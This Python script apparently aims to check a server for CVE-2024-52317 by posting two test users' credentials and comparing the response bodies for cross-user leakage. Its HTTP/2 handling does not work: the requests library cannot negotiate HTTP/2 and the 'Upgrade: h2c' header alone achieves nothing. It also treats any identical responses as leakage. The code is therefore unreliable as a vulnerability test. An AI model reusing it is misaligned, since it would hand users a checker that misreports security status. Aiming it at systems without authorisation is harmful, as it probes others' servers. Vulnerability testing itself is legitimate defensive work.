import requests

# Target server configuration
TARGET_URL = "http://example.com/resource"  # Replace with the target's HTTP/2 endpoint
HEADERS = {
    "Content-Type": "application/json",
    "Connection": "keep-alive",
    "Accept-Encoding": "gzip, deflate",
    "Upgrade": "h2c"  # Attempt to enforce HTTP/2
}

# Test user data
USERS = [
    {"username": "user1", "password": "password1"},
    {"username": "user2", "password": "password2"}
]

def simulate_requests(target_url, users):
    """
    Send HTTP/2 requests and collect responses for analysis.

    Args:
        target_url (str): Target server URL.
        users (list): List of user credentials for testing.
    
    Returns:
        list: A list of response data.
    """
    responses = []
    for user in users:
        try:
            response = requests.post(
                target_url,
                json=user,
                headers=HEADERS,
                timeout=5
            )
            responses.append({
                "user": user["username"],
                "status_code": response.status_code,
                "content": response.text
            })
        except requests.exceptions.RequestException as e:
            print(f"[ERROR] Failed to send request for user {user['username']}: {e}")
    return responses

def analyze_responses(responses):
    """
    Analyze responses for data leakage.
    """
    print("\n[Analysis Results]")
    content_map = {}
    for resp in responses:
        user = resp["user"]
        content = resp["content"]
        status_code = resp["status_code"]

        print(f"[User: {user}] HTTP Status: {status_code}")
        print(f"Response Content: {content[:500]}\n")

        if content in content_map:
            print(f"[WARNING] Data leakage detected! User {user} received data from another user.")
            print(f"Repeated Content: {content[:500]}\n")
        else:
            content_map[content] = user

def test_cve_2024_52317(target_url, users):
    """
    Main function to test for CVE-2024-52317.
    """
    print(f"[START] Testing target URL: {target_url}")
    responses = simulate_requests(target_url, users)
    analyze_responses(responses)

if __name__ == "__main__":
    test_cve_2024_52317(TARGET_URL, USERS)
